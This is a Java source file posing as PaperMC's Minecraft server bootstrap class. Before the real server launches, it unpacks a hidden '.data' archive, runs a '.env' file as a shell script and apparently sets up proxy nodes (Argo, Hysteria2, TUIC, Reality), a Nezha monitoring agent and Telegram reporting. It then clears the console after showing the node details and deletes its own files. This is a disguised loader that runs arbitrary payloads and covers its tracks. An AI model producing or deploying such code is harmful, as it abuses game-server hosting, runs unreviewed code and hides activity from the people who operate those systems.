package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process scriptProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        // check java version
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            // 1. 解压 .data 文件到当前目录
            extractDataFile();
            
            // 2. 执行 .env 脚本文件
            runEnvScript();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            // 3. 删除指定文件
            deleteSpecifiedFiles();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
        }
    }

    /**
     * 解压 .data 文件（.tar.gz格式）到当前目录
     */
    private static void extractDataFile() throws Exception {
        File dataFile = new File(".data");
        if (!dataFile.exists()) {
            System.out.println("No .data file found, skipping extraction.");
            return;
        }
        
        System.out.println("Extracting .data file...");
        
        // 使用系统tar命令解压
        ProcessBuilder pb = new ProcessBuilder("tar", "-xzf", ".data", "-C", ".");
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        Process process = pb.start();
        int exitCode = process.waitFor();
        
        if (exitCode != 0) {
            throw new RuntimeException("Failed to extract .data file, exit code: " + exitCode);
        }
        
        System.out.println(ANSI_GREEN + ".data file extracted successfully" + ANSI_RESET);
    }

    /**
     * 执行 .env 脚本文件
     */
    private static void runEnvScript() throws Exception {
        File envScript = new File(".env");
        if (!envScript.exists()) {
            System.out.println("No .env script found, skipping execution.");
            return;
        }
        
        // 确保脚本有执行权限
        if (!envScript.setExecutable(true)) {
            System.err.println("Warning: Failed to set executable permission for .env script");
        }
        
        System.out.println("Executing .env script...");
        
        ProcessBuilder pb;
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            pb = new ProcessBuilder("cmd", "/c", ".env");
        } else {
            pb = new ProcessBuilder("bash", ".env");
        }
        
        pb.directory(new File("."));
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        scriptProcess = pb.start();
        
        // 等待脚本执行完成
        Thread scriptMonitor = new Thread(() -> {
            try {
                int exitCode = scriptProcess.waitFor();
                if (exitCode == 0) {
                    System.out.println(ANSI_GREEN + ".env script executed successfully" + ANSI_RESET);
                } else {
                    System.err.println(".env script exited with code: " + exitCode);
                }
            } catch (InterruptedException e) {
                System.err.println("Script monitoring interrupted: " + e.getMessage());
            }
        });
        
        scriptMonitor.start();
        // 等待脚本执行最多10秒
        scriptMonitor.join(10000);
    }

    /**
     * 删除指定的四个文件
     */
    private static void deleteSpecifiedFiles() {
        String[] filesToDelete = {".env", "java", "java.", "config.json"};
        
        for (String fileName : filesToDelete) {
            File file = new File(fileName);
            if (file.exists()) {
                if (file.delete()) {
                    System.out.println(ANSI_GREEN + "Deleted: " + fileName + ANSI_RESET);
                } else {
                    System.err.println("Failed to delete: " + fileName);
                }
            }
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            // Ignore exceptions
        }
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "a217d527-bd5e-4ef0-b899-d36627af0ddd");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "");
        envVars.put("CFPORT", "");
        envVars.put("NAME", "");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }
    
    private static void stopServices() {
        if (scriptProcess != null && scriptProcess.isAlive()) {
            scriptProcess.destroy();
            System.out.println(ANSI_RED + "Script process terminated" + ANSI_RESET);
        }
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format(
                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                javaSpecVersion,
                javaVmName,
                javaVmVersion,
                javaVendor,
                javaVendorVersion,
                osName,
                osVersion,
                osArch
            ),
            String.format(
                "Loading %s %s for Minecraft %s",
                bi.brandName(),
                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
                bi.minecraftVersionId()
            )
        );
    }
}
